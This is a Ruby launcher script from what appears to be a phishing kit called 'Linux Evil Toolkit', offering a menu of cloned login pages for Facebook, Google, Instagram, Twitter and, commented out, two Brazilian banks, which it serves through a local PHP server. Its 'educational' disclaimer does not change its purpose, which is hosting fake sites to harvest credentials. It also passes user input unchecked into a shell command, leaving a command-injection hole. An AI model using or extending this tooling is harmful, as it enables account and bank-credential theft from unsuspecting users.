#! /bin/ruby
#-------------------------------------------------------------
#
#                     Linux Evil Toolkit
# 
#                          By v0id
#
#
#-------------------------------------------------------------

require_relative './modules/colors.rb'

include Colors

# Warning: I am not responsible for the way that this software 
# will be used by third parties. The purpose of this software 
# is only educational.

puts "\n\n"
prYellow '  /$$$$$$                                                   '
prYellow ' /$$__  $$                                                  '
prYellow '| $$  \__/  /$$$$$$   /$$$$$$  /$$    /$$ /$$$$$$   /$$$$$$ '
prYellow '|  $$$$$$  /$$__  $$ /$$__  $$|  $$  /$$//$$__  $$ /$$__  $$'
prYellow ' \____  $$| $$$$$$$$| $$  \__/ \  $$/$$/| $$$$$$$$| $$  \__/'
prYellow ' /$$  \ $$| $$_____/| $$        \  $$$/ | $$_____/| $$      '
prYellow '|  $$$$$$/|  $$$$$$$| $$         \  $/  |  $$$$$$$| $$      '
prYellow ' \______/  \_______/|__/          \_/    \_______/|__/      '
prYellow '                                                            '
prYellow '                                                            '
prYellow '                                                            '
puts "\n\n"
prYellow "============================================================="
prYellow "[0] Exit"
#prYellow "[1] banco do brazil"
prYellow "[2] facebook"
prYellow "[3] gooogle chrome"
#prYellow "[4] caixa economica federal"
prYellow "[5] google"
prYellow "[6] instagram"
prYellow "[7] twitter"
prYellow "============================================================="

PS1 = "\033[92m #{'[SimpleServer]::[LETK]$ '}\033[00m"
MSG = 'Set server ip:port: [127.0.0.1:8080]: '

print PS1; cmd = gets.chomp.to_s
print MSG; ip_port = gets.chomp.to_s
ip_port == '' ? ip_port = '127.0.0.1:8080': nil
case cmd
when '0'
	exit
when '1'
	#system "cd ./pages/banco-do-brazil.com.br  && php -S #{ip_port}"
when '2'
	system "cd ./pages/facebook.com && php -S #{ip_port}"
when '3'
	system "cd ./pages/gooogle-chrome.com && php -S #{ip_port}"
when '4'
	#system "cd ./pages/caixa-economica-federal.com && php -S #{ip_port}"
when '5'
	system "cd ./pages/google.com && php -S #{ip_port}"
when '6'
	system "cd ./pages/instagram.com && php -S #{ip_port}"
when '7'
	system "cd ./pages/twitter.com && php -S #{ip_port}"

else 
	prRed '[COMMAND_ERROR]: Invalid'
	exit
end
puts "Server started at #{ip_port}"



			 	 			 	 